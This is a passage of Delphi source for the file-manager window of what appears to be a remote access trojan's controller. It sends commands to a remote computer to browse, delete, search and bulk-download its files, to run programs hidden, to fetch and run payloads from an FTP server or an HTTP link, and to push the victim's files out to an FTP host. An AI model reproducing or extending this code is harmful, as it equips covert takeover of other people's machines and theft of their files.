  if Copy(ExplorerPath, 1, Pos('\', ExplorerPath)-1) = TmpStr1 then Delete(ExplorerPath, 1, Length(TmpStr1) + 1);
  if Pos('[', ExplorerPath) > 0 then ExplorerPath := Copy(ExplorerPath, 1, Pos(' ', ExplorerPath)-1);

  SendDatas(Client.AThread, FILESLISTFOLDERS + '|' + ExplorerPath);
  UpdateStatus('Requesting remote directory list, please wait...');
end;

procedure TFormFilesManager.N3Click(Sender: TObject);
var
  TmpStr: string;
begin
  if ExplorerPath = '' then Exit;
  if not InputQuery(PROGRAMNAME + ' ' + PROGRAMVERSION, 'Folder name', TmpStr) then Exit;
  SendDatas(Client.AThread, FILESNEWFOLDER + '|' + ExplorerPath + TmpStr);
end;

procedure TFormFilesManager.V1Click(Sender: TObject);
begin
  SendDatas(Client.AThread, FILESEXECUTEVISIBLE + '|' + ExplorerPath + lv1.Selected.Caption);
end;

procedure TFormFilesManager.H1Click(Sender: TObject);
begin
  SendDatas(Client.AThread, FILESEXECUTEHIDEN + '|' + ExplorerPath + lv1.Selected.Caption);
end;

procedure TFormFilesManager.R1Click(Sender: TObject);
begin
  SendDatas(Client.AThread, FILESLISTFOLDERS + '|' + ExplorerPath);
  UpdateStatus('Requesting remote directory list, please wait...');
end;

procedure TFormFilesManager.P2Click(Sender: TObject);
var
  TmpStr: string;
begin
  if Length(ExplorerPath) = 3 then
  begin
    R1.Click;
    Exit;
  end;

  TmpStr := ExplorerPath;
  TmpStr := Copy(TmpStr, 1, Length(TmpStr)-1);
  TmpStr := Copy(TmpStr, 1, LastDelimiter('\', TmpStr));
  ExplorerPath := TmpStr;
  SendDatas(Client.AThread, FILESLISTFOLDERS + '|' + ExplorerPath);
  UpdateStatus('Requesting remote directory list, please wait...');
end;

procedure TFormFilesManager.C2Click(Sender: TObject);
begin
  ClipboardPath := 'COPY|' + ExplorerPath + lv1.Selected.Caption;
  UpdateStatus('File "' + lv1.Selected.Caption + '" copied to clipboard!');
end;

procedure TFormFilesManager.C3Click(Sender: TObject);
begin
  ClipboardPath := 'CUT|' + ExplorerPath + lv1.Selected.Caption;
  UpdateStatus('File "' + lv1.Selected.Caption + '" copied to clipboard!');
end;

procedure TFormFilesManager.P3Click(Sender: TObject);
var
  TmpStr: string;
begin
  if (ExplorerPath = '') or (ClipboardPath = '') then Exit;
  TmpStr := Copy(ClipboardPath, 1, 3);
  Delete(ClipboardPath, 1, Pos('|', ClipboardPath));

  if TmpStr = 'CUT' then
  begin
    if ExtractFileName(ClipboardPath) = '' then
      SendDatas(Client.AThread, FILESMOVEFOLDER + '|' + ClipboardPath + '|' + ExplorerPath + ExtractFileName(ClipboardPath))
    else SendDatas(Client.AThread,  FILESMOVEFILE+ '|' + ClipboardPath + '|' + ExplorerPath + ExtractFileName(ClipboardPath));
  end
  else
  begin
    if ExtractFileName(ClipboardPath) = '' then
      SendDatas(Client.AThread, FILESCOPYFOLDER + '|' + ClipboardPath + '|' + ExplorerPath + ExtractFileName(ClipboardPath))
    else SendDatas(Client.AThread,  FILESCOPYFILE+ '|' + ClipboardPath + '|' + ExplorerPath + ExtractFileName(ClipboardPath));
  end;
end;

procedure TFormFilesManager.R2Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery(PROGRAMNAME + ' ' + PROGRAMVERSION, 'New name', TmpStr) then Exit;
  if (lv1.Selected.ImageIndex = 5) and (lv1.Selected.Caption <> '..') then
    SendDatas(Client.AThread, FILESRENAMEFOLDER + '|' + ExplorerPath + lv1.Selected.Caption + '|' +
              ExplorerPath + TmpStr)
  else
    SendDatas(Client.AThread, FILESRENAMEFILE + '|' + ExplorerPath + lv1.Selected.Caption + '|' +
              ExplorerPath + TmpStr);
end;

procedure TFormFilesManager.D1Click(Sender: TObject);
var
  TmpStr: string;
  i: Integer;
begin
  if MessageBox(Handle, 'Selected file(s)/folder(s) will be definitively deleted from remote computer. Do you want to continue?',
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_YESNOCANCEL or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> IDYES then Exit;

  for i := 0 to lv1.Items.Count-1 do
  begin
    if lv1.Items.Item[i].Selected = True then
    begin
      if (lv1.Items.Item[i].ImageIndex = 5) and (lv1.Items.Item[i].Caption <> '..') then
        SendDatas(Client.AThread, FILESDELETEFOLDER + '|' + ExplorerPath + lv1.Items.Item[i].Caption)
      else SendDatas(Client.AThread, FILESDELETEFILE + '|' + ExplorerPath + lv1.Items.Item[i].Caption);
    end;
  end;
end;

procedure TFormFilesManager.lv1KeyPress(Sender: TObject; var Key: Char);
begin
  if Key = Char(VK_DELETE) then D1Click(D1);
end;

procedure TFormFilesManager.E5Click(Sender: TObject);
begin
  SendDatas(Client.AThread, FILESVIEWFILE + '|' + ExplorerPath + lv1.Selected.Caption);
end;

function IsImageFile(Filename: string): Boolean;
var
  i: Integer;
begin
  Result := False;
  for i := 0 to High(ImageType) do
  begin
    if LowerCase(ExtractFileExt(Filename)) = ImageType[i] then
    begin
      Result := True;
      Break;
    end;
  end;
end;

procedure TFormFilesManager.I1Click(Sender: TObject);
var
  i: Integer;
  TmpStr: string;
begin   
  for i := 0 to lv1.Items.Count - 1 do
  begin
    if (lv1.Items.Item[i].ImageIndex <> 5) and (lv1.Items.Item[i].Caption <> '..') then
    if IsImageFile(lv1.Items.Item[i].Caption) then
    TmpStr := TmpStr + ExplorerPath + lv1.Items.Item[i].Caption + '|';
  end;

  if TmpStr = '' then Exit;
  SendDatas(Client.AThread, FILESIMAGEPREVIEW + '|' + TmpStr);
  UpdateStatus('Requesting remote image thumbnails, please wait...');
end;

procedure TFormFilesManager.D5Click(Sender: TObject);
var
  TmpStr: string;
  i: Integer;
begin
  if lv1.SelCount > 1 then
  begin
    for i := 0 to lv1.Items.Count-1 do
    begin
      if (lv1.Items.Item[i].Selected = True) and (lv1.Items.Item[i].ImageIndex <> 5) then
        TmpStr := TmpStr + ExplorerPath + lv1.Items.Item[i].Caption + '|';
    end;
                              
    if TmpStr = '' then Exit;
    SendDatas(Client.AThread, FILESMULTIDOWNLOAD + '|' + TmpStr);
    Exit;
  end;

  if lv1.Selected.ImageIndex = 5 then Exit;
  SendDatas(Client.AThread, FILESDOWNLOADFILE + '|' + ExplorerPath + lv1.Selected.Caption);
end;

procedure TFormFilesManager.F1Click(Sender: TObject);
begin
  if ExplorerPath = '' then Exit;
  dlgOpen1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := '(*.*)|*.*';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  case MessageBox(Handle, 'Do you want to execute file?',
                  PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                  MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) of
    IDYES:  SendDatas(Client.AThread, FILESUPLOADFILEFROMLOCAL + '|' +
                      ExplorerPath + '|' + dlgOpen1.FileName + '|Y|' +
                      IntToStr(MyGetFileSize(dlgOpen1.FileName)) + '|');
    IDNO: SendDatas(Client.AThread, FILESUPLOADFILEFROMLOCAL + '|' +
                    ExplorerPath + '|' + dlgOpen1.FileName + '|N|' +
                    IntToStr(MyGetFileSize(dlgOpen1.FileName)) + '|');
  end;
end;

procedure TFormFilesManager.F2Click(Sender: TObject);
var
  TmpForm: TFormFTPManager;
begin
  TmpForm := TFormFTPManager.Create(Application);
  TmpForm.edtFtphost.Text := FtpHost;
  TmpForm.edtFtpUser.Text := FtpUser;
  TmpForm.edtFtpPass.Text := FtpPass;
  TmpForm.edtFtpDir.Text := FtpDir;
  TmpForm.edtFilename.Text := FtpFilename;
  TmpForm.seFtpPort.Value := FtpPort;

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  FtpHost := TmpForm.edtFtphost.Text;
  FtpUser := TmpForm.edtFtpUser.Text;
  FtpPass :=TmpForm.edtFtpPass.Text;
  FtpDir := TmpForm.edtFtpDir.Text;
  FtpFilename := TmpForm.edtFilename.Text;
  FtpPort := TmpForm.seFtpPort.Value;

  if (FtpHost = '') or (FtpUser = '') or (FtpPass = '') or
    (FtpDir = '') or (FtpFilename = '')
  then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  case MessageBox(Handle, 'Do you want to execute file?',
                  PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                  MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) of
    IDYES:  SendDatas(Client.AThread, FILESUPLOADFILEFROMFTP + '|' +
                      ExplorerPath + '|' + FtpHost + '|' + FtpUser + '|' +
                      FtpPass + '|' + FtpDir + '|' + FtpFilename + '|' +
                      IntToStr(FtpPort) + '|Y');
    IDNO: SendDatas(Client.AThread, FILESUPLOADFILEFROMFTP + '|' +
                    ExplorerPath + '|' + FtpHost + '|' + FtpUser + '|' +
                    FtpPass + '|' + FtpDir + '|' + FtpFilename + '|' +
                    IntToStr(FtpPort) + '|N');
  end;

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormFilesManager.F3Click(Sender: TObject);
var
  TmpStr: string;
begin
  if ExplorerPath = '' then Exit;
  if not InputQuery(PROGRAMNAME + ' ' + PROGRAMVERSION, 'Http link', TmpStr) then Exit;
  SendDatas(Client.AThread, FILESUPLOADFILEFROMLINK + '|' + ExplorerPath + '|' + TmpStr);
end;
  
procedure TFormFilesManager.S1Click(Sender: TObject);
var
  TmpForm: TFormFTPManager;
begin
  TmpForm := TFormFTPManager.Create(Application);
  TmpForm.edtFtphost.Text := FtpHost;
  TmpForm.edtFtpUser.Text := FtpUser;
  TmpForm.edtFtpPass.Text := FtpPass;
  TmpForm.edtFtpDir.Text := FtpDir;
  TmpForm.edtFilename.Text := ExplorerPath + lv1.Selected.Caption;
  TmpForm.edtFilename.Enabled := False;
  TmpForm.seFtpPort.Value := FtpPort;

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  FtpHost := TmpForm.edtFtphost.Text;
  FtpUser := TmpForm.edtFtpUser.Text;
  FtpPass :=TmpForm.edtFtpPass.Text;
  FtpDir := TmpForm.edtFtpDir.Text;
  FtpFilename := TmpForm.edtFilename.Text;
  FtpPort := TmpForm.seFtpPort.Value;

  if (FtpHost = '') or (FtpUser = '') or (FtpPass = '') or (FtpDir = '') then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  SendDatas(Client.AThread, FILESSENDFTP + '|' +
            FtpHost + '|' + FtpUser + '|' + FtpPass + '|' + FtpDir + '|' +
            FtpFilename + '|' + IntToStr(FtpPort) + '|N');

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormFilesManager.T1Click(Sender: TObject);
begin
  FormTransfersManager.Show;
end;

procedure TFormFilesManager.C1Click(Sender: TObject);
begin
  if ExplorerPath = '' then Exit;
  SetClipboardText(ExplorerPath + lv1.Selected.Caption);
end;

procedure TFormFilesManager.E7Click(Sender: TObject);
begin
  ExplorerPath := ExtractFilePath(lv2.Selected.Caption);
  SendDatas(Client.AThread, FILESLISTFOLDERS + '|' + ExplorerPath);
  UpdateStatus('Requesting remote directory list, please wait...');
  pgc1.ActivePageIndex := 0;
end;

procedure TFormFilesManager.I2Click(Sender: TObject);
var
  i: Integer;
  TmpStr: string;
begin
  for i := 0 to lv2.Items.Count -1 do
  if IsImageFile(lv2.Items.Item[i].Caption) then
  TmpStr := TmpStr + lv2.Items.Item[i].Caption + '|';

  if TmpStr = '' then Exit;
  SendDatas(Client.AThread, FILESSEARCHIMAGEPREVIEW + '|' + TmpStr);
  UpdateStatus('Requesting remote image thumbnails, please wait...');
end;

procedure TFormFilesManager.E8Click(Sender: TObject);
begin
  SendDatas(Client.AThread, FILESEDITFILE + '|' + lv2.Selected.Caption);
end;

procedure TFormFilesManager.R3Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery(PROGRAMNAME + ' ' + PROGRAMVERSION, 'New name', TmpStr) then Exit;
  SendDatas(Client.AThread, FILESRENAMEFILE + '|' + lv2.Selected.Caption + '|' +
              ExtractFilePath(lv2.Selected.Caption) + TmpStr);
end;

procedure TFormFilesManager.D4Click(Sender: TObject);
var
  TmpStr: string;
  i: Integer;
begin
  if MessageBox(Handle, 'Selected file(s) will be definitively deleted from remote computer. Do you want to continue?',
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_YESNOCANCEL or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> IDYES then Exit;

  for i := 0 to lv2.Items.Count-1 do
  SendDatas(Client.AThread, FILESDELETEFILE + '|' + lv2.Items.Item[i].Caption);
end;
   
procedure TFormFilesManager.lv2KeyPress(Sender: TObject; var Key: Char);
begin
  if Key = Char(VK_DELETE) then D4Click(D4);
end;

procedure TFormFilesManager.D3Click(Sender: TObject);
var
  TmpStr: string;
  i: Integer;
begin
  if lv2.SelCount > 1 then
  begin
    for i := 0 to lv2.Items.Count-1 do
    TmpStr := TmpStr + lv2.Items.Item[i].Caption + '|';

    if TmpStr = '' then Exit;
    SendDatas(Client.AThread, FILESMULTIDOWNLOAD + '|' + TmpStr);
    Exit;
  end;

  SendDatas(Client.AThread, FILESDOWNLOADFILE + '|' + lv2.Selected.Caption);
end;

procedure TFormFilesManager.S3Click(Sender: TObject);
var
  TmpForm: TFormFTPManager;
begin
  TmpForm := TFormFTPManager.Create(Application);
  TmpForm.edtFtphost.Text := FtpHost;
  TmpForm.edtFtpUser.Text := FtpUser;
  TmpForm.edtFtpPass.Text := FtpPass;
  TmpForm.edtFtpDir.Text := FtpDir;
  TmpForm.edtFilename.Text := lv2.Selected.Caption;
  TmpForm.edtFilename.Enabled := False;
  TmpForm.seFtpPort.Value := FtpPort;

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  FtpHost := TmpForm.edtFtphost.Text;
  FtpUser := TmpForm.edtFtpUser.Text;
  FtpPass :=TmpForm.edtFtpPass.Text;
  FtpDir := TmpForm.edtFtpDir.Text;
  FtpFilename := TmpForm.edtFilename.Text;
  FtpPort := TmpForm.seFtpPort.Value;

  if (FtpHost = '') or (FtpUser = '') or (FtpPass = '') or (FtpDir = '') then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  SendDatas(Client.AThread, FILESSENDFTP + '|' +
            FtpHost + '|' + FtpUser + '|' + FtpPass + '|' + FtpDir + '|' +
            FtpFilename + '|' + IntToStr(FtpPort) + '|N');

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormFilesManager.btn1Click(Sender: TObject);
var
  TmpStr, TmpStr1: string;
begin
  TmpStr := edtPath.Text;
  if TmpStr = '' then Exit;
  if edtFilename.Text = '' then Exit;
  btn1.Enabled := False;
  btn2.Enabled := True;

  if chkSubdir.Checked = True then
    TmpStr1 := FILESSEARCHFILE + '|' + TmpStr + '|' + edtFilename.Text + '|Y'
  else TmpStr1 := FILESSEARCHFILE + '|' + TmpStr + '|' + edtFilename.Text + '|N';

  SendDatas(Client.AThread, TmpStr1);
  UpdateStatus('Searching remote file "' + edtFilename.Text + '" on path "' + TmpStr + '", please wait...');
end;

procedure TFormFilesManager.btn2Click(Sender: TObject);
begin
  btn1.Enabled := True;
  btn2.Enabled := False;
  SendDatas(Client.AThread, FILESSTOPSEARCHING + '|');
end;

procedure TFormFilesManager.pgc1Change(Sender: TObject);
begin
  if pgc1.ActivePageIndex = 1 then edtPath.Text := ExplorerPath;
end;

procedure TFormFilesManager.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  IniFile: TIniFile;
  TmpStr: string;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteInteger('Files manager', 'Left', Left);
  IniFile.WriteInteger('Files manager', 'Top', Top);  
  IniFile.WriteInteger('Files manager', 'Width', Width);
  IniFile.WriteInteger('Files manager', 'Height', Height);
  IniFile.Free;
end;

procedure TFormFilesManager.FormCreate(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  Left := IniFile.ReadInteger('Files manager', 'Left', 230);
  Top := IniFile.ReadInteger('Files manager', 'Top', 144);
  Width := IniFile.ReadInteger('Files manager', 'Width', 696);
  Height := IniFile.ReadInteger('Files manager', 'Height', 360);
  IniFile.Free;
end;

end.
